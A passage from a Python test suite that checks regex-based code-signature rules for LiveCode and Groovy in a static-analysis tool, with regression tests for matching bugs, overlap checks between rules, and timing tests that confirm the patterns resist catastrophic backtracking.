    bypasses = LIVECODE_RULES["safety_bypasses"]
    reflection = LIVECODE_RULES["reflection_metaprogramming"]

    assert bypasses.search('do "put 1 into x"'), 'safety_bypasses: do "..." quoted-string form still didn\'t match'
    assert bypasses.search("do (tExpr)"), "safety_bypasses: do (...) paren form still didn't match"
    assert not bypasses.search("do tScriptText"), (
        "safety_bypasses incorrectly matched 'do <bareIdentifier>' (excluded by design; see reflection_metaprogramming)"
    )

    assert reflection.search('do "put 1 into x"'), (
        'reflection_metaprogramming: do "..." quoted-string form still didn\'t match'
    )
    assert reflection.search("do tScriptText"), "reflection_metaprogramming: do <identifier> form regressed"


def test_livecode_ipc_rpc_bridges_shell_trailing_boundary_regression():
    """
    Regression test (Rule 10): `shell\\s*\\(` ends on the self-delimiting
    `(`, but the shared trailing `\\b` required a word character
    immediately after it -- so the dominant real call shape (a quoted
    command string, e.g. `shell("ls -la")`) never matched; only an
    unquoted bare-identifier argument (`shell(tCmd)`) did. Fixed by
    pulling it out of the group with the trailing `\\b` dropped.
    """
    pattern = LIVECODE_RULES["ipc_rpc_bridges"]
    assert pattern.search('put shell("ls -la") into tOutput'), 'shell("...") quoted-argument form still didn\'t match'
    assert pattern.search("put shell(tCommand) into tOutput"), "shell(identifier) form regressed"
    assert pattern.search('open socket "127.0.0.1:8080"'), "unrelated ipc_rpc_bridges alternative regressed"


# ==============================================================================
# COMMENT-STYLE COMPLETENESS (Rule 12)
# ==============================================================================
# NOTE: see the cross-cutting finding documented at the top of this section --
# these verify each regex's own documented multi-style behavior in isolation,
# matching this suite's existing convention (e.g. SQLITE's dead_code test).
# Whether prism.py's live comment-stream extraction actually delivers
# '--'/'#'-prefixed text to these regexes in the real pipeline is a separate,
# unresolved gap (livecode's declared "standard_block" family only recognizes
# '//' and '/* */').


def test_livecode_dead_code_comment_style_completeness():
    pattern = LIVECODE_RULES["dead_code"]
    assert pattern.search("-- put 1 into x"), "'--' style regressed"
    assert pattern.search("# on mouseUp"), "'#' style regressed"
    assert pattern.search("// function foo"), "'//' style regressed"


def test_livecode_doc_comment_style_completeness():
    pattern = LIVECODE_RULES["doc"]
    assert pattern.search("--| @param pName the user name"), "'--|' doc-block style regressed"
    assert pattern.search("--@ @author Jane Doe"), "'--@' doc-block style regressed"
    assert pattern.search("/** @param pName the user name\n@return true */"), "'/**' doc-block style regressed"
    assert pattern.search("//! @author Jane Doe"), "'//!' doc-block style regressed"
    assert pattern.search("-- Author: Jane Doe"), "'--' plain Author: tag regressed"


def test_livecode_ownership_comment_style_completeness():
    pattern = LIVECODE_RULES["ownership"]
    assert pattern.search("-- Author: Jane Doe"), "'--' style regressed"
    assert pattern.search("# Author: Jane Doe"), "'#' style regressed"
    assert pattern.search("// Author: Jane Doe"), "'//' style regressed"


# ==============================================================================
# AMBIGUITY SWEEP
# ==============================================================================


def test_livecode_ambiguity_safety_vs_explicit_casts_is_a_dual_classification():
    """
    Confirmed intentional dual-classification, not a bug: LiveCode's
    "is a"/"is strictly" type-check assertion genuinely serves both
    `safety` (a defensive runtime guard) and `explicit_casts` (a type
    introspection) at once -- the same construct legitimately plays two
    roles, the same shape as the Pester `Should -Match` dual-classification
    called out in how_to_add_a_language.md's ambiguity-sweep guidance.
    """
    safety = LIVECODE_RULES["safety"]
    casts = LIVECODE_RULES["explicit_casts"]
    text = "if tValue is a number then"
    assert safety.search(text) and casts.search(text)


def test_livecode_ambiguity_safety_vs_sync_locks_lock_dual_classification():
    """
    Confirmed intentional dual-classification, not a bug: `lock screen` /
    `lock messages` / `lock errorDialogs` are listed verbatim in both
    `safety` (defensive UI-update suppression) and `sync_locks` (explicit
    coordination to prevent race conditions) -- LiveCode is single-
    threaded, so these constructs really do serve both purposes
    simultaneously (suppressing UI/message races during a critical
    section), matching Rule 1's guidance to capture practical semantic
    reality over one-key-per-construct purity.
    """
    safety = LIVECODE_RULES["safety"]
    locks = LIVECODE_RULES["sync_locks"]
    text = "lock screen"
    assert safety.search(text) and locks.search(text)


def test_livecode_ambiguity_listeners_func_start_events_full_overlap():
    """
    Confirmed structurally-forced (not a bug to "fix" at the regex level):
    every handler declaration ("on X") matches `func_start` (its
    structural anchor), `listeners` (LiveCode's message-passing paradigm
    means every handler IS a de facto broadcast listener for that
    message), and -- for the specific enumerated UI/lifecycle event names
    -- `events` too. There is no syntactic distinction in HyperTalk
    between "a handler" and "a listener registration"; they are the same
    construct. Narrowing `listeners` to avoid this would require inventing
    a distinction the language doesn't actually have, which
    how_to_add_a_language.md's "don't force a fit" guidance warns against.
    """
    func_start = LIVECODE_RULES["func_start"]
    listeners = LIVECODE_RULES["listeners"]
    events = LIVECODE_RULES["events"]
    text = "on mouseUp"
    assert func_start.search(text) and listeners.search(text) and events.search(text)


def test_livecode_ambiguity_doc_vs_ownership_author_dual_classification():
    """
    Confirmed intentional dual-classification, not a bug: an "Author:"
    tag is simultaneously structured documentation (`doc`) and authorship
    metadata (`ownership`) -- the same real-world convention JSDoc's
    `@author` tag represents in other languages, where both signatures
    are expected to co-fire on the same line.
    """
    doc = LIVECODE_RULES["doc"]
    ownership = LIVECODE_RULES["ownership"]
    text = "-- Author: Jane Doe"
    assert doc.search(text) and ownership.search(text)


def test_livecode_ambiguity_io_vs_ipc_rpc_bridges_url_dual_classification():
    """
    Confirmed intentional dual-classification, not a bug: `io` and
    `ipc_rpc_bridges` are a baseline signal and a Hybrid Domain Sensor
    layered on top of it (per how_to_add_a_language.md's "Hybrid Domain
    Sensors are explicitly additional specialized lenses" framing) --
    URL/socket/process operations are expected to fire both, since a
    network call genuinely is both raw I/O and an inter-process/RPC
    bridge.
    """
    io = LIVECODE_RULES["io"]
    ipc = LIVECODE_RULES["ipc_rpc_bridges"]
    text = 'get url "http://example.com"'
    assert io.search(text) and ipc.search(text)


def test_livecode_ambiguity_test_vs_regex_execution_no_collision():
    """
    Known cross-language ambiguity pattern (TypeScript's `.test(` vs
    `regex_execution` collision) checked and confirmed NOT present here:
    livecode's `test` signature keys off `command test*`/`pass test`/
    `fail test`/framework names (Levure/LcU/runTests), none of which
    overlap with `regex_execution`'s `matchText`/`matchChunk`/
    `replaceText`/`filter ... with regex` keywords.
    """
    test = LIVECODE_RULES["test"]
    regex_exec = LIVECODE_RULES["regex_execution"]
    assert test.search("command testLogin") and not regex_exec.search("command testLogin")
    assert regex_exec.search('matchText(tString, "^[0-9]+$")') and not test.search('matchText(tString, "^[0-9]+$")')


def test_livecode_ambiguity_explicit_casts_vs_pointers_no_collision():
    """
    Known cross-language ambiguity pattern (C's cast-syntax vs
    pointer-asterisk collision) checked and confirmed NOT present here:
    livecode's `explicit_casts` keys off the English-style "is a"/"is
    strictly" assertions, and `pointers` keys off the `@identifier`
    pass-by-reference sigil -- disjoint token shapes, no overlap.
    """
    casts = LIVECODE_RULES["explicit_casts"]
    pointers = LIVECODE_RULES["pointers"]
    assert casts.search("if tValue is a number then") and not pointers.search("if tValue is a number then")
    assert pointers.search("command updateList @pList") and not casts.search("command updateList @pList")


# ==============================================================================
# REDOS SCALING VERIFICATION
# ==============================================================================
# Reuses the _detonate() subprocess primitive that assert_redos_immune() (top
# of file) is built on, but captures the actual per-size duration so growth
# can be measured across several geometrically increasing sizes -- a single
# pass/fail timing (as assert_redos_immune alone gives) can't distinguish
# "fast because linear" from "fast because still below the O(n^2) knee at
# this size", so #593 asks for explicit multi-point scaling instead.


def _measure_scaling_point(pattern: re.Pattern, payload: str, timeout_sec: float = 2.0) -> float:
    ctx = multiprocessing.get_context("spawn")
    result_queue = ctx.Queue()
    p = ctx.Process(target=_detonate, args=(pattern, payload, result_queue))
    p.start()
    p.join(timeout_sec)
    if p.is_alive():
        p.terminate()
        p.join()
        raise AssertionError(f"ReDoS TRIGGERED at scaling checkpoint! payload len={len(payload)}\n{pattern.pattern}")
    if result_queue.empty():
        raise AssertionError("Scaling checkpoint process produced no timing (crashed?)")
    return result_queue.get()


def assert_linear_redos_scaling(pattern: re.Pattern, payload_fn, sizes=(2000, 4000, 8000, 16000, 32000)):
    """
    Measures pattern.search() time at each size in `sizes` (each isolated
    in its own subprocess via the shared _detonate primitive) and asserts
    the growth between consecutive sizes stays roughly linear (~2x per
    doubling). A ~4x-per-doubling signature is O(n^2) catastrophic
    backtracking and fails the assertion.
    """
    timings = [_measure_scaling_point(pattern, payload_fn(n)) for n in sizes]
    for i in range(1, len(timings)):
        prev, cur = timings[i - 1], timings[i]
        if prev < 0.0005:
            continue  # too fast at this size to derive a meaningful ratio
        ratio = cur / prev
        assert ratio < 3.5, (
            f"Possible catastrophic backtracking: {sizes[i - 1]}->{sizes[i]} chars grew "
            f"{ratio:.2f}x (expected ~2x for linear scaling). Timings: {list(zip(sizes, timings))}"
        )
    return timings


_LIVECODE_REDOS_SCALING_TARGETS = [
    ("args", lambda n: "on foo " + "x" * n),
    ("state_mutation", lambda n: "put " + "x" * n),
    ("io", lambda n: "post " + "x" * n),
    ("concurrency", lambda n: "send " + "x" * n),
    ("comprehensions", lambda n: "filter " + "x" * n),
    ("class_start", lambda n: "module " + "a." * n),
    ("doc", lambda n: "--| " + "x" * n),
    ("regex_execution", lambda n: "filter " + "x" * n),
    ("ipc_rpc_bridges", lambda n: "post " + "x" * n),
    ("_dependency_capture", lambda n: "require " + "x" * n),
]


@pytest.mark.parametrize("key,payload_fn", _LIVECODE_REDOS_SCALING_TARGETS)
def test_livecode_redos_linear_scaling(key, payload_fn):
    pattern = LIVECODE_RULES[key]
    assert_linear_redos_scaling(pattern, payload_fn)


def test_livecode_pointers_redos_immune():
    """Dedicated single-shot check (ceiling guard) on top of the scaling sweep above."""
    pattern = LIVECODE_RULES["pointers"]
    assert_redos_immune(pattern, "@" * 40000, timeout_sec=3.0)


def test_livecode_globals_redos_immune():
    pattern = LIVECODE_RULES["globals"]
    assert_redos_immune(pattern, "the " * 20000, timeout_sec=3.0)


# ==============================================================================
# GROOVY: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #584)
# ==============================================================================
GROOVY_RULES = LANGUAGE_DEFINITIONS["groovy"]["rules"]

_GROOVY_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    # --- PHASE 1 ---
    ("branch", "if (x > 0) { return x } else { return -x }", "def x = 1"),
    ("args", "def calculate(int x, int y = Math.max(3, 4)) {", "def x = 1"),
    ("structural_boundaries", "class Foo {}", "if (x > 0) { println x }"),
    ("func_start", "void plainMethod(String x) {", "if (x) {"),
    ("class_start", "class Foo extends Bar {", "def foo() {}"),
    # --- PHASE 2 ---
    ("safety", "try { risky() } catch (Exception e) { }", "def x = 1"),
    ("safety_bypasses", "def x = null", "def x = 5"),
    ("high_risk_execution", "System.exit(1)", "println 'hi'"),
    ("io", "def f = new File('data.txt')", "def x = 1"),
    ("api", "@RestController\nclass FooController {}", "class Foo {}"),
    ("state_mutation", "count = count + 1", "count == expected"),
    ("dead_code", "// def oldMethod() {}", "// just a comment"),
    ("doc", "/**\n * @param x the value\n */", "// just a comment"),
    ("test", "@Test\nvoid testFoo() { assert x == 1 }", "def x = 1"),
    # --- PHASE 3 ---
    ("concurrency", "def t = new Thread({ doWork() })", "def x = 1"),
    ("ui_framework", "def frame = new JFrame('Title')", "def x = 1"),
    ("closures", "list.each { it * 2 }", "def x = 1"),
    ("globals", "def home = System.getProperty('user.home')", "def x = 1"),
    ("decorators", "@CompileStatic\nclass Foo {}", "class Foo {}"),
    ("generics", "Map<String, List<Id>> data", "String data"),
    ("comprehensions", "list.collect { it.toUpperCase() }", "def x = 1"),
    ("scientific", "def r = Math.sqrt(4)", "def x = 1"),
    ("reflection_metaprogramming", "foo.metaClass.bar = { -> 42 }", "def x = 1"),
    ("import", "import com.example.Foo", "def x = 1"),
    ("ownership", "// @author Jane Doe", "// regular comment"),
    # --- PHASE 4 ---
    ("planned_debt", "// TODO: refactor this", "// regular comment"),
    ("fragile_debt", "// HACK: workaround for build tool bug", "// regular comment"),
    ("spec_exposure", "// [SPEC-123] audit trail", "// regular comment"),
    ("ssr_boundaries", "@ResponseBody\ndef foo() {}", "def foo() {}"),
    ("events", "@EventListener\ndef onFoo() {}", "def foo() {}"),
    ("dependency_injection", "dependencies {\n    implementation 'foo'\n}", "def x = 1"),
    # --- PHASE 5 ---
    ("telemetry", "logger.info('starting')", "println 'starting'"),
    ("debug_prints", "println 'debug value: ' + x", "logger.info('x')"),
    ("explicit_casts", "def x = (int) y", "def x = y"),
    ("panics_and_aborts", "throw new RuntimeException('bad')", "return x"),
    ("thread_sleeps", "Thread.sleep(1000)", "def x = 1"),
    ("bitwise_ops", "def flags = mask ^ other", "def flags = mask && other"),
    ("sync_locks", "synchronized(lock) { doWork() }", "def x = 1"),
    ("immutability_locks", "final String name = 'x'", "String name = 'x'"),
    ("cleanup", "connection.close()", "def x = 1"),
    ("encapsulation", "private String name", "String name"),
    ("listeners", "button.addListener(handler)", "def x = 1"),
    ("test_skip", "@Ignore\nvoid testFoo() {}", "void testFoo() {}"),
]


@pytest.mark.parametrize("signature,positive,negative", _GROOVY_SIMPLE_CASES)
def test_groovy_signature_positive_and_negative(signature, positive, negative):
    pattern = GROOVY_RULES[signature]
    assert pattern is not None, f"groovy's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"groovy {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"groovy {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_groovy_dependency_capture_extracts_import_path():
    """
    `import`'s paired capture-group rule (`_dependency_capture`) was
    entirely absent from groovy's dict (not `None`) -- unlike every other
    JVM-family language here (e.g. java), which pairs `import` with a
    `_dependency_capture` group feeding the dependency graph. Groovy
    imports follow the identical syntax, so the omission was a coverage
    gap, not an intentional Strict-Feature-Parity `None`. Added the key;
    this proves it captures group 1 as the exact dependency path.
    """
    pattern = GROOVY_RULES["_dependency_capture"]
    assert pattern is not None, "_dependency_capture should not be None for groovy"

    m = pattern.search("import com.example.foo.Bar")
    assert m and m.group(1) == "com.example.foo.Bar"

    m2 = pattern.search("import static com.example.Utils.helper")
    assert m2 and m2.group(1) == "com.example.Utils.helper"

    m3 = pattern.search("import com.example.gradle.Plugin;")
    assert m3 and m3.group(1) == "com.example.gradle.Plugin"


def test_groovy_dead_code_comment_style_completeness_regression():
    """
    Regression test (Rule 12): groovy is `standard_block` (both `//` and
    `/* */` are valid comment delimiters), but `dead_code`'s keyword check
    only ever fired on `//` -- every block-commented-out construct
    (`/* class Foo {} */`) silently never matched even though the
    identical line commented with `//` did.
    """
    pattern = GROOVY_RULES["dead_code"]
    for keyword in ("def", "class", "void", "if", "for", "while", "import"):
        line_style = f"// {keyword} foo() {{ }}"
        block_style = f"/* {keyword} foo() {{ }} */"
        assert pattern.search(line_style), f"'//' style with {keyword!r} didn't match"
        assert pattern.search(block_style), f"'/* */' style with {keyword!r} didn't match"


def test_groovy_state_mutation_equality_operator_false_positive_regression():
    """
    Regression test, confirmed real bug: the trailing bare `=` in
    `^[ \\t]*\\w+(?:\\.\\w+)*[ \\t]*=` matched the first `=` of `==`,
    miscounting every equality comparison (`result == expected`) as a
    variable assignment. Fixed by adding a negative lookahead excluding a
    second `=`.
    """
    pattern = GROOVY_RULES["state_mutation"]
    assert not pattern.search("result == expected"), "== equality check regressed to a state_mutation match"
    assert not pattern.search("count == 0"), "== equality check regressed to a state_mutation match"
    assert pattern.search("x = 5"), "real assignment regressed"
    assert pattern.search("result = compute()"), "real assignment regressed"


def test_groovy_func_start_and_args_primitive_and_void_return_type_regression():
    """
    Regression test, confirmed real bug: the return-type stepper
    (`(?:[A-Z][a-zA-Z0-9_<>\\[\\]?]*[ \\t]+){0,2}`) required an uppercase
    first character, so any method with a lowercase primitive or `void`
    return type -- `void foo()`, `int add()`, `boolean isValid()` --
    never matched `func_start` or `args` at all. These are among the most
    common method signatures in Groovy/Java-interop code. Fixed by adding
    an explicit primitive-keyword alternative (with an optional `[]` for
    array-of-primitive returns).
    """
    func_start = GROOVY_RULES["func_start"]
    args = GROOVY_RULES["args"]

    for snippet in (
        "void plainMethod(String x) {",
        "int add(int a, int b) {",
        "boolean isValid() {",
        "long computeHash() {",
    ):
        assert func_start.search(snippet), f"func_start regressed on primitive/void return type: {snippet!r}"
        assert args.search(snippet), f"args regressed on primitive/void return type: {snippet!r}"

    assert func_start.search("int[] getArray() {"), "array-of-primitive return type still didn't match"


def test_groovy_func_start_and_args_multi_param_generic_return_type_regression():
    """
    Regression test, confirmed real bug: the return-type stepper's
    character class excluded `,`, so a multi-parameter generic return
    type (`Map<String, Integer> calculateTotals(...)`) broke after the
    first type parameter -- the internal space-after-comma inside the
    generic couldn't be consumed as the required inter-token whitespace,
    so the whole method signature never matched. Fixed by adding `,` to
    the class, which -- combined with the existing space-separated
    repetition -- naturally splits `Map<String,`/`Integer>` into two
    tokens (same technique already used by C#'s func_start for this
    exact bug class).
    """
    func_start = GROOVY_RULES["func_start"]
    args = GROOVY_RULES["args"]

    signature = "Map<String, Integer> calculateTotals(List<Item> items) {"
    m = func_start.search(signature)
    assert m and m.group(1) == "calculateTotals", "multi-param generic return type still didn't match func_start"
    assert args.search(signature), "multi-param generic return type still didn't match args"


def test_groovy_func_start_and_args_synchronized_block_false_positive_regression():
    """
    Ambiguity-sweep finding, confirmed a real bug in both `func_start` and
    `args`: a synchronized block (`synchronized(lock) { ... }`) has the
    identical `identifier(...) {` textual shape as a real method
    declaration/call. `func_start` already excluded other control-flow
    keywords (if/for/while/switch/catch) but was missing `synchronized`;
    `args` had no exclusion list at all and hallucinated a "parameter
    block" out of every control-flow statement's condition
    (`if (x) {`, `while (x) {`, `switch (x) {`, `for (i in ...) {`,
    `catch (Exception e) {`, `synchronized(lock) {`). Confirmed
    pre-existing (present before this issue's return-type fixes, verified
    via `git stash`). Fixed by adding the missing keyword to func_start's
    exclusion list and adding the same style of exclusion to args.
    """
    func_start = GROOVY_RULES["func_start"]
    args = GROOVY_RULES["args"]

    control_flow_blocks = [
        "if (x > 0) {",
        "while (x) {",
        "switch (x) {",
        "for (i in 1..10) {",
        "catch (Exception e) {",
        "synchronized(lock) {",
    ]
    for snippet in control_flow_blocks:
        assert not func_start.search(snippet), f"func_start incorrectly matched a control-flow block: {snippet!r}"
        assert not args.search(snippet), f"args incorrectly matched a control-flow block: {snippet!r}"

    # Real method signatures and constructor/lambda arg forms must still match.
    assert func_start.search("void plainMethod(String x) {")
    assert args.search("void plainMethod(String x) {")
    assert args.search("(x, y) -> x + y")


def test_groovy_args_nested_paren_default_value_regression():
    """
    Nested-delimiter audit (Rule 11): `args`' parameter-list matcher used
    a flat `[^)]*` class, which broke on a one-level-nested call inside a
    default parameter value (`int y = Math.max(3, 4)`) -- it truncated at
    the *inner* call's closing `)`, leaving the method's own closing `)`
    uncaptured. Fixed with a bounded one-level-nesting form.
    """
    pattern = GROOVY_RULES["args"]
    m = pattern.search("def calculate(int x, int y = Math.max(3, 4)) {")
    assert m is not None
    assert m.group(0) == "def calculate(int x, int y = Math.max(3, 4))", (
        f"nested default-value call broke the paren match: {m.group(0)!r}"
    )


def test_groovy_decorators_nested_paren_regression():
    """
    Nested-delimiter audit (Rule 11): `decorators`' optional argument
    matcher used a flat `[^)]*` class, which broke on a one-level-nested
    call inside an annotation argument -- exactly the realistic
    `@Grab(..., version=resolveVersion())` shape this issue calls out.
    Fixed with a bounded one-level-nesting form so the full annotation
    (including its real closing `)`) is captured.
    """
    pattern = GROOVY_RULES["decorators"]
    snippet = "@Grab(group='org.example', module='lib', version=resolveVersion())"
    m = pattern.search(snippet)
    assert m is not None
    assert m.group(0) == snippet, f"nested @Grab call broke the paren match: {m.group(0)!r}"

    assert pattern.search("@CompileStatic"), "zero-arg decorator regressed"
    assert pattern.search("@Grab(group='org.example', module='lib', version='1.0')"), "simple @Grab regressed"


def test_groovy_generics_nested_regression():
    """
    Nested-delimiter audit (Rule 11): `generics` used a flat `[^>]*`
    class, which broke on the exact one-level-nested construct this
    issue calls out (`Map<String, List<Id>>`) -- it truncated at the
    first `>` (after `List<Id`), leaving the real closing `>>` only
    half-consumed. Fixed with a bounded one-level-nesting form.
    """
    pattern = GROOVY_RULES["generics"]
    m = pattern.search("Map<String, List<Id>> data")
    assert m is not None
    assert m.group(0) == "<String, List<Id>>", f"nested generic broke the bracket match: {m.group(0)!r}"

    assert pattern.search("List<String> names"), "simple generic regressed"


def test_groovy_dependency_injection_brace_trailing_boundary_regression():
    """
    Regression test (Rule 9, trailing-side variant): `plugins\\s*\\{` and
    `dependencies\\s*\\{` both end on `{`, a non-word character. Wrapped
    in a shared trailing `\\b(...)\\b`, that boundary could never fire --
    there is no word/non-word transition between `{` and whatever follows
    it (whitespace or newline, both non-word). `plugins { ... }` and
    `dependencies { ... }` -- the two most common Gradle DSL entry points
    for dependency injection -- never matched at all. Fixed by dropping
    the trailing `\\b` on the two brace-ending alternatives (the `{` is
    already self-delimiting).
    """
    pattern = GROOVY_RULES["dependency_injection"]
    assert pattern.search("plugins {\n    id 'groovy'\n}"), "plugins { still didn't match"
    assert pattern.search("dependencies {\n    implementation 'foo'\n}"), "dependencies { still didn't match"
    assert pattern.search("apply plugin: 'java'"), "apply plugin regressed"
    assert pattern.search("@Autowired"), "Spring annotation alternative regressed"


def test_groovy_closures_paren_less_trailing_closure_regression():
    """
    Regression test, confirmed real bug: both alternatives in the
    original `closures` pattern (`->` and `\\{...->}`) required a literal
    `->`. Groovy's single most common closure shape -- the paren-less
    trailing closure with the implicit `it` parameter (`list.each { it *
    2 }`, `.collect { println it }`) -- has no arrow at all and never
    matched either alternative. Fixed by adding a dot-method-call-into-
    brace alternative.
    """
    pattern = GROOVY_RULES["closures"]
    assert pattern.search("list.each { it * 2 }"), "implicit-it .each closure didn't match"
    assert pattern.search("list.collect { println it }"), "implicit-it .collect closure didn't match"
    assert pattern.search("numbers.findAll { it > 5 }"), "implicit-it .findAll closure didn't match"
    assert pattern.search("list.each { x -> println x }"), "explicit-arg closure regressed"
    assert pattern.search("def c = { a, b -> a + b }"), "multi-arg closure literal regressed"


def test_groovy_comprehensions_paren_less_trailing_closure_regression():
    """
    Regression test, confirmed real bug: `comprehensions` required a
    literal `(` immediately after the iterator method name
    (`\\.each\\(`), but Groovy's idiomatic call form for these methods is
    a paren-less trailing closure (`list.each { it }`,
    `.collect { it * 2 }`) -- the far more common shape never matched at
    all. Fixed by allowing either `(` or `{` after the method name.
    """
    pattern = GROOVY_RULES["comprehensions"]
    assert pattern.search("list.each { it * 2 }"), "paren-less .each didn't match"
    assert pattern.search("list.collect { it.toUpperCase() }"), "paren-less .collect didn't match"
    assert pattern.search("def result = list.findAll { it > 5 }"), "paren-less .findAll didn't match"
    assert pattern.search("list.each(x)"), "parenthesized call form regressed"


def test_groovy_closures_redos_immunity():
    """
    ReDoS scaling verification (Rule 5), confirmed real O(n^2)
    catastrophic backtracking on the *original* pattern: the closure-
    params alternative was `\\{\\s*(?:it|[\\w\\s,]+)\\s*->`, where
    `[\\w\\s,]+` and the immediately following `\\s*` both accept
    whitespace -- an unclosed `{` followed by thousands of spaces forced
    the engine to retry every possible split of the whitespace run
    between the two quantifiers. Verified genuine hang: the unfixed
    pattern already timed out (>5s) at n=2000. Fixed by collapsing into a
    single bounded, non-overlapping class before the required `->` (same
    technique as kotlin's closures fix).
    """
    pattern = GROOVY_RULES["closures"]

    timings = []
    for n in (2000, 4000, 8000, 16000, 32000):
        payload = "{" + " " * n
        start = time.perf_counter()
        pattern.search(payload)
        timings.append(time.perf_counter() - start)

    assert_redos_immune(pattern, "{" + " " * 100000, timeout_sec=3.0)

    for earlier, later in zip(timings, timings[1:]):
        assert later < max(earlier * 2.5, 0.01), f"closures scaling regressed toward O(n^2): {timings}"

    # Realistic closures must still match after the fix.
    assert pattern.search("list.each { it }")
    assert pattern.search("{ x -> x + 1 }")


def test_groovy_spec_exposure_quadratic_blowup_redos_regression():
    """
    ReDoS scaling verification (Rule 5), confirmed real O(n^2)
    catastrophic backtracking: the original pattern's `\\d+` and the
    trailing `[^\\]]*` both greedily match digit characters with no
    closing `]` ever present -- an unclosed `[SPEC-11111...` tag
    backtracks by re-scanning an ever-shrinking digit suffix.
    This is the same bug class already fixed for shell and sqlite's
    spec_exposure elsewhere in this file, but groovy (and ~24 other
    languages sharing the identical unbounded pattern -- see this issue's
    PR description for the full cross-language finding) still carried the
    vulnerable form. A digit-heavy adversarial payload is required to
    trigger it -- a letter-only payload (as used to verify some other
    languages' spec_exposure in this same epic, e.g. yacc) does not, since
    `\\d+` stops immediately at the first non-digit and there is no
    overlap to backtrack through. Fixed by bounding the trailing class to
    `{0,300}` (the same clamp already used by shell/sqlite's spec_exposure
    for this exact bug).
    """
    pattern = GROOVY_RULES["spec_exposure"]

    timings = []
    for n in (2000, 4000, 8000, 16000, 32000):
        payload = "[SPEC-" + "1" * n
        start = time.perf_counter()
        pattern.search(payload)
        timings.append(time.perf_counter() - start)

    assert_redos_immune(pattern, "[SPEC-" + "1" * 100000, timeout_sec=3.0)

    # Generous ceiling (real O(n^2) is ~4x/doubling): absorbs scheduler
    # noise under a full-suite parallel run while still catching a
    # regression back to catastrophic backtracking.
    for earlier, later in zip(timings, timings[1:]):
        assert later < max(earlier * 3.0, 0.02), f"spec_exposure scaling regressed toward O(n^2): {timings}"

    assert pattern.search("[SPEC-123] audit trail"), "realistic spec tag regressed"
    assert pattern.search("[audit] traceability tag"), "realistic audit tag regressed"


def test_groovy_redos_immunity():
    """
    ReDoS scaling verification (Rule 5) for the remaining rules with
    unbounded-looking quantifiers, each fired against a never-closing
    adversarial payload at a large multiplier. None showed a real
    catastrophic-backtracking growth curve, so no bounding was needed for
    these -- included here as regression coverage against a future edit
    reintroducing an unbounded ambiguity.
    """
    assert_redos_immune(GROOVY_RULES["args"], "def foo(" + "a," * 50000, timeout_sec=2.0)
    assert_redos_immune(GROOVY_RULES["func_start"], "public Foo " * 50000, timeout_sec=2.0)
    assert_redos_immune(GROOVY_RULES["generics"], "<A" * 50000, timeout_sec=2.0)
    assert_redos_immune(GROOVY_RULES["decorators"], "@Foo(" * 50000, timeout_sec=2.0)
    assert_redos_immune(GROOVY_RULES["state_mutation"], "a." * 50000, timeout_sec=2.0)
    assert_redos_immune(GROOVY_RULES["dependency_injection"], "plugins {" * 50000, timeout_sec=2.0)
    assert_redos_immune(GROOVY_RULES["class_start"], "public " * 50000, timeout_sec=2.0)
    assert_redos_immune(GROOVY_RULES["import"], "import " + "a." * 50000, timeout_sec=2.0)
    assert_redos_immune(GROOVY_RULES["ownership"], "@author " + "x" * 100000, timeout_sec=2.0)

    # Realistic-but-large inputs must still match after any bounding.
    assert GROOVY_RULES["args"].search("def foo(String x, int y) {")
    assert GROOVY_RULES["func_start"].search("void plainMethod(String x) {")
    assert GROOVY_RULES["generics"].search("List<String> names")
    assert GROOVY_RULES["decorators"].search("@CompileStatic")
    assert GROOVY_RULES["state_mutation"].search("x = 5")
    assert GROOVY_RULES["dependency_injection"].search("plugins {")
    assert GROOVY_RULES["class_start"].search("class Foo {")
    assert GROOVY_RULES["import"].search("import com.example.Foo")
    assert GROOVY_RULES["ownership"].search("@author Jane Doe")


def test_groovy_lexical_family_dead_code_fires_under_both_comment_styles():
    """
    Comment-style audit (Rule 12), confirming lexical_family parity beyond
    the single-keyword regression above: groovy is `standard_block`, so
    both native comment delimiters must independently trigger dead_code
    for the same underlying commented-out logic.
    """
    pattern = GROOVY_RULES["dead_code"]
    for keyword in ("def", "class", "if", "for", "while", "import"):
        line_style = f"// {keyword} (x) {{ }}"
        block_style = f"/* {keyword} (x) {{ }} */"
        assert pattern.search(line_style), f"'//' style with {keyword!r} didn't match"
        assert pattern.search(block_style), f"'/* */' style with {keyword!r} didn't match"


def test_groovy_bitwise_ops_and_closures_no_false_collision():
    """
    Known ambiguity pattern from the issue template (bitwise_ops vs
    closures, previously found in Rust's `|a| a + 1` and C++'s
    `std::cout <<`): checked and confirmed a structurally-forced
    non-collision, not a bug. `bitwise_ops` deliberately excludes `<<`
    and `>>` (Groovy heavily overloads `<<` for list/stream appending) and
    only fires on `^`/`~`, neither of which closures' `->`/`{...->}`/
    `.method {` shapes ever produce. Confirmed no shared literal token
    between the two rules on realistic code.
    """
    bitwise_ops = GROOVY_RULES["bitwise_ops"]
    closures = GROOVY_RULES["closures"]

    closure_snippet = "list.each { it -> it * 2 }"
    assert closures.search(closure_snippet)
    assert not bitwise_ops.search(closure_snippet)

    append_snippet = "list << newItem"
    assert not bitwise_ops.search(append_snippet), "Groovy's << append operator incorrectly flagged as bitwise_ops"

    bitwise_snippet = "def flags = mask ^ other"
    assert bitwise_ops.search(bitwise_snippet)
    assert not closures.search(bitwise_snippet)


def test_groovy_func_start_and_generics_intentional_overlap():
    """
    Known ambiguity pattern from the issue template (func_start vs
    generics, previously found in C# via deeply nested generic return
    types): confirmed a genuine, intentional double-classification for
    groovy, not a bug. A method with a generic return type
    (`Map<String, Integer> calculateTotals(...)`) is legitimately BOTH a
    function declaration AND a use of generics -- the same text span
    correctly satisfies both signatures simultaneously.
    """
    func_start = GROOVY_RULES["func_start"]
    generics = GROOVY_RULES["generics"]

    signature = "Map<String, Integer> calculateTotals(List<Item> items) {"
    assert func_start.search(signature)
    assert generics.search(signature)

    # A generic-free method must still satisfy func_start alone.
    plain = "void plainMethod(String x) {"
    assert func_start.search(plain)
    assert not generics.search(plain)


def test_groovy_high_risk_execution_and_panics_and_aborts_system_exit_intentional_overlap():
    """
    Ambiguity-sweep finding: both `high_risk_execution` and
    `panics_and_aborts` list `System.exit` as an alternative. Confirmed
    intentional, not a bug: `System.exit()` genuinely fits both
    categories simultaneously -- it is a process-killing, catastrophic
